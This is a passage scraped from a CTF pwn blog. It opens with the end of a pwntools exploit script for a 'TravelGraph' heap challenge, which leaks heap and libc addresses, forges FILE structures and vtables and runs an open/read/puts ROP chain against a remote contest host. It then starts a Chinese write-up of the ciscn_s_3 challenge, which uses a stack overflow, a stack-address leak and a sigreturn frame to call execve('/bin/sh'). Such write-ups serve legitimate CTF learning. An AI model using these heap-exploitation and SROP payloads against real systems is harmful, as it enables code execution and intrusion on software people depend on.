class="comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span></span><br><span class="line">binary_path = <span class="string">&quot;./TravelGraph/pwn&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &quot;/home/NazrinDuck/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/libc.so.6&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./TravelGraph/libc.so.6&quot;</span></span><br><span class="line">ld_path = <span class="string">&quot;/home/NazrinDuck/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"><span class="comment"># libc_dll = cdll.LoadLibrary(libc_path)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;139.155.126.78&quot;</span>, <span class="number">38875</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">def search(func_name: str, func_addr: int):</span></span><br><span class="line"><span class="string">    log.success(func_name + &quot;: &quot; + hex(func_addr))</span></span><br><span class="line"><span class="string">    libc = LibcSearcher(func_name, func_addr)</span></span><br><span class="line"><span class="string">    offset = func_addr - libc.dump(func_name)</span></span><br><span class="line"><span class="string">    binsh = offset + libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">    system = offset + libc.dump(&quot;system&quot;)</span></span><br><span class="line"><span class="string">    log.success(&quot;system: &quot; + hex(system))</span></span><br><span class="line"><span class="string">    log.success(&quot;binsh: &quot; + hex(binsh))</span></span><br><span class="line"><span class="string">    return (system, binsh)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_from_libc</span>(<span class="params">func_name: <span class="built_in">str</span>, func_addr: <span class="built_in">int</span>, libc=libc</span>):</span><br><span class="line">    log.success(func_name + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(func_addr))</span><br><span class="line">    offset = func_addr - libc.symbols[func_name]</span><br><span class="line">    binsh = offset + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">    system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">    <span class="keyword">return</span> (system, binsh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># __libc_start_main</span></span><br><span class="line"></span><br><span class="line">csu_start = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">edi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, r12=<span class="number">0</span>, start=csu_start, mode=<span class="number">0</span></span>):</span><br><span class="line">    end = start + <span class="number">0x1A</span></span><br><span class="line">    payload = p64(end)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">        payload += p64(r12)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload += p64(edi)  <span class="comment"># r12</span></span><br><span class="line">        payload += p64(rsi)  <span class="comment"># edi</span></span><br><span class="line">        payload += p64(rdx)  <span class="comment"># rsi</span></span><br><span class="line">        payload += p64(r12)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(start)</span><br><span class="line">    payload += <span class="string">b&quot;a&quot;</span> * <span class="number">56</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sig</span>(<span class="params">rax=<span class="number">0</span>, rdi=<span class="number">0</span>, rsi=<span class="number">0</span>, rdx=<span class="number">0</span>, rsp=<span class="number">0</span>, rip=<span class="number">0</span></span>):</span><br><span class="line">    sigframe = SigreturnFrame()</span><br><span class="line">    sigframe.rax = rax</span><br><span class="line">    sigframe.rdi = rdi  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">    sigframe.rsi = rsi</span><br><span class="line">    sigframe.rdx = rdx</span><br><span class="line">    sigframe.rsp = rsp</span><br><span class="line">    sigframe.rip = rip</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(sigframe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.35</span></span><br><span class="line"><span class="comment"># 2.37</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># transport: car, train, plane</span></span><br><span class="line"><span class="comment"># size ----&gt;  0x510 0x520 0x530</span></span><br><span class="line"><span class="comment"># max ---&gt; 0x3e8</span></span><br><span class="line">transport = [<span class="string">b&quot;car&quot;</span>, <span class="string">b&quot;train&quot;</span>, <span class="string">b&quot;plane&quot;</span>]</span><br><span class="line">city = [<span class="string">b&quot;guangzhou&quot;</span>, <span class="string">b&quot;nanning&quot;</span>, <span class="string">b&quot;changsha&quot;</span>, <span class="string">b&quot;nanchang&quot;</span>, <span class="string">b&quot;fuzhou&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">transport_num, city_from, city_to, size, note</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, transport[transport_num])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_to])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;far?\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Note:\n&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">city_from, city_to</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, city[city_to])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">city_from, city_to</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, city[city_to])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">city_from, city_to, num, size, note</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_from])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_to])</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;change?\n&quot;</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;far?\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;Note:\n&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>(<span class="params">city_num</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;.\n&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;name\n&quot;</span>, city[city_num])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">calculate(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;fence&quot;</span>)</span><br><span class="line">delete(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1000</span>, <span class="string">b&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span> + <span class="string">b&quot;|&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = (recv(<span class="string">b&quot;\n&quot;</span>) &lt;&lt; <span class="number">0x8</span>) - <span class="number">0x2400</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;add&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1000</span>, <span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;b&quot;</span> * <span class="number">0xF</span> + <span class="string">b&quot;|&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;|&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset = 0x1F6CE0</span></span><br><span class="line">offset = <span class="number">0x21ACE0</span></span><br><span class="line"></span><br><span class="line">libc_addr = recv(<span class="string">b&quot;\n&quot;</span>) - offset</span><br><span class="line">_IO_list_all = libc_addr + libc.sym._IO_list_all</span><br><span class="line">setcontext = libc_addr + libc.sym.setcontext + <span class="number">61</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># delete(4, 0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x10</span> + p32(<span class="number">0</span>) + p32(<span class="number">3</span>) + p32(<span class="number">0x3000</span>) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">delete(<span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1000</span>, <span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1000</span>, <span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1000</span>, <span class="string">b&quot;dddd&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1000</span>, <span class="string">b&quot;cccc&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">fake_wide_data_addr = heap_addr + <span class="number">0x2940</span></span><br><span class="line">fake_vtable_addr = heap_addr + <span class="number">0x2940</span> + <span class="number">0xF0</span></span><br><span class="line"><span class="comment"># _IO_wstrn_jumps = libc_addr + 0x1F3340 - 0x18</span></span><br><span class="line">_IO_wstrn_jumps = libc_addr + <span class="number">0x2171C0</span> - <span class="number">0x18</span></span><br><span class="line">orw_addr = fake_vtable_addr + <span class="number">0x80</span></span><br><span class="line">attack_addr = heap_addr + <span class="number">0x800</span></span><br><span class="line"><span class="comment"># gadget = libc_addr + 0x0000000000126FA8</span></span><br><span class="line"><span class="comment"># 0x0000000000126fa8: mov rdx, rax; call qword ptr [rbx + 0x28];</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x0000000000085251: mov rdx, qword ptr [rbx + 0x40]; mov rdi, rbx; sub rdx, rsi; call qword ptr [rax + 0x70];</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># gadget = libc_addr + 0x000000000010AA6F</span></span><br><span class="line">gadget = libc_addr + <span class="number">0x0000000000085251</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = attack_addr</span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rsp = attack_addr + <span class="number">8</span></span><br><span class="line">frame.rip = libc_addr + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">orw = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">fake_vtable = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_vtable += p64(setcontext)</span><br><span class="line">fake_vtable += p64(gadget)</span><br><span class="line">fake_vtable = fake_vtable.ljust(<span class="number">0x70</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_vtable += p64(setcontext)</span><br><span class="line">fake_vtable += p64(<span class="number">0</span>)</span><br><span class="line">fake_vtable += orw</span><br><span class="line"></span><br><span class="line">fake_wide_data = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_wide_data = fake_wide_data.ljust(<span class="number">0x18</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_wide_data += p64(<span class="number">1</span>)</span><br><span class="line">fake_wide_data += p64(<span class="number">2</span>)</span><br><span class="line">fake_wide_data = fake_wide_data.ljust(<span class="number">0xE0</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_wide_data += p64(fake_vtable_addr)</span><br><span class="line">fake_wide_data += p64(<span class="number">0</span>)</span><br><span class="line">fake_wide_data += fake_vtable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;p&quot;</span> * <span class="number">0x500</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x531</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(_IO_list_all - <span class="number">0x20</span>)</span><br><span class="line">payload += <span class="string">b&quot;o&quot;</span> * <span class="number">0x508</span></span><br><span class="line">payload += p64(<span class="number">0x521</span>)</span><br><span class="line">payload += fake_wide_data.ljust(<span class="number">0x510</span>, <span class="string">b&quot;q&quot;</span>)</span><br><span class="line"><span class="comment"># payload += b&quot;q&quot; * 0x510</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_io = p64(<span class="number">0x800</span>)</span><br><span class="line">fake_io += p64(<span class="number">0x521</span>)</span><br><span class="line">fake_io += p64(libc_addr + offset) * <span class="number">2</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0x38</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io += p64(orw_addr)  <span class="comment">#                 &lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line">fake_io += p64(orw_addr + <span class="number">0xFFFFFFFF</span>)  <span class="comment">#                 &lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line">fake_io += p64(orw_addr + <span class="number">0xFFFFFFFF</span>)  <span class="comment">#                 &lt;&lt;&lt;&lt;&lt;</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xA0</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io += p64(fake_wide_data_addr)</span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0xC0</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">fake_io += p64(<span class="number">1</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(_IO_wstrn_jumps)</span><br><span class="line"></span><br><span class="line">payload += fake_io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ls(heap_addr)</span><br><span class="line">ls(libc_addr)</span><br><span class="line">ls(_IO_list_all)</span><br><span class="line">ls(_IO_list_all - libc_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;.&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;\n&quot;</span>, transport[<span class="number">2</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name&quot;</span>, city[<span class="number">4</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name&quot;</span>, city[<span class="number">3</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;far?&quot;</span>, <span class="built_in">str</span>(<span class="number">1000</span>).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Note:&quot;</span>, <span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">add(2, 4, 3, 1000, b&quot;cccc&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">open_addr = libc.sym.<span class="built_in">open</span> + libc_addr</span><br><span class="line">read_addr = libc.sym.read + libc_addr</span><br><span class="line">puts_addr = libc.sym.puts + libc_addr</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x00000000000240e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002573e: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x0000000000026302: pop rdx; ret;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x000000000002a3e5: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x000000000002be51: pop rsi; ret;</span></span><br><span class="line"><span class="string">0x000000000011f2e7: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pop_rdi = libc_addr + 0x240E5</span></span><br><span class="line"><span class="string">pop_rsi = libc_addr + 0x2573E</span></span><br><span class="line"><span class="string">pop_rdx = libc_addr + 0x26302</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pop_rdi = libc_addr + <span class="number">0x2A3E5</span></span><br><span class="line">pop_rsi = libc_addr + <span class="number">0x000000000002BE51</span></span><br><span class="line">pop_rdx = libc_addr + <span class="number">0x000000000011F2E7</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(attack_addr)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(heap_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(puts_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># _IO_switch_to_wget_mode</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/23/writeup4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/23/writeup4/" class="post-title-link" itemprop="url"> [CTF pwn] ciscn_s_3 write up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-02-23 15:49:40" itemprop="dateCreated datePublished" datetime="2024-02-23T15:49:40+08:00">2024-02-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-14 23:47:35" itemprop="dateModified" datetime="2024-10-14T23:47:35+08:00">2024-10-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>昨天做了一个晚上的麻烦题，研究了好长时间也没在本地打通，结果第二天早上一试远程就通了，估计本地环境没有搭好</p>
<p>首先checksec一下：</p>
<p><img src="/images/writeup/4/1.png" alt="1"></p>
<p>很平常的64位程序，只开了一个NX，接着进ida64：</p>
<p>main函数直接跳转到了vuln函数，我们先分析vuln函数：</p>
<p><img src="/images/writeup/4/2.png" alt="2"></p>
<p>注意这里的sys_read与sys_write，它们和之前的read和write库函数是不同的。仔细分析发现左侧的函数表中并没有read和write函数。我们直接看汇编：</p>
<p><img src="/images/writeup/4/3.png" alt="3"></p>
<p>这里用到的指令是syscall。上网上<a target="_blank" rel="noopener" href="https://blog.csdn.net/shuzishij/article/details/87005219">查了查</a>，这个指令是用来进行系统调用的，根据rax寄存器的值来执行不同的系统调用，传参用的寄存器依旧是rdi，rsi，rdx等。</p>
<p>这个指令和32位的int 80h中断很相似，只不过后者传参用寄存器是ebx，ecx等，而且调用表也不一样。(32位的execve是11,64位的是59，即0x3B)</p>
<p>第一个系统调用时rax为0，调用的便是sys_read，第二个rax为1，调用的便是sys_write；</p>
<p>还有一个要注意的是该程序push了rbp之后没有leave，所以正常是无法正确退出的，我们构造溢出时就不用补rbp了</p>
<p>了解了这点后我们再接着分析，发现buf很显然存在溢出风险，可以尝试构造ROP链进行攻击；</p>
<p>注意到程序里的gadgets函数：</p>
<p>反汇编什么都没有，我们直接看汇编：</p>
<p><img src="/images/writeup/4/4.png" alt="4"></p>
<p>结合程序给出的syscall，这里有两段gadget可以利用，一个是0x4004DA段可以将rax设置为0xF，另一个0x4004E2段可以将rax设置为0x3B；</p>
<p>根据上面的表，前者指向的是rt_sigreturn，后者指向的是execve，接下来ROP链的有两个方向；</p>
<p>无论是哪个方向，都需要一个指向”&#x2F;bin&#x2F;sh”的地址，由于程序里没有相关字符串，我们需要在栈上构造&#x2F;bin&#x2F;sh并泄露栈地址，第一波攻击思路便是利用sys_write输出的0x30个字符中找到和栈地址相关的数据；</p>
<p>先来gdb调试一下子：</p>
<p><img src="/images/writeup/4/stack.png" alt="stack"></p>
<p>这是ret时的栈结构，可以看出没有leave导致ret的地址指向了rbp而不是下一个0x400536，我们再看看它输出的0x30个字符：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<img src="/images/writeup/4/6.png" alt="6" style="zoom:67%;" />

<p>这里和gdb分析的一样，我们覆盖的rbp的后面紧接着就是地址0x400536，注意到在接下来的地址指向了一个某一个栈地址，我们可以利用这个泄露来计算buf地址的偏移，从而在栈上构造&#x2F;bin&#x2F;sh；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stackAddr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x138</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(stackAddr))</span><br></pre></td></tr></table></figure>

<p>这里的stackAddr指向的是buf的基地址，下一轮我们直接在payload的未溢出部分写入&#x2F;bin&#x2F;sh：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>接下来我们有sigreturn和execve两个方向，</p>
<p>对于前者，我在CTFwiki上查到了<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">相关资料以及利用手段</a>，参考了给的例题以及网上其他的write up尝试构造了一份：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">0x3b</span></span><br><span class="line">sigframe.rdi = stackAddr  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stackAddr</span><br><span class="line">sigframe.rip = syscall_retAddr</span><br></pre></td></tr></table></figure>

<p>然后再把它接到syscall的后面作为伪造的signal Frame ：</p>
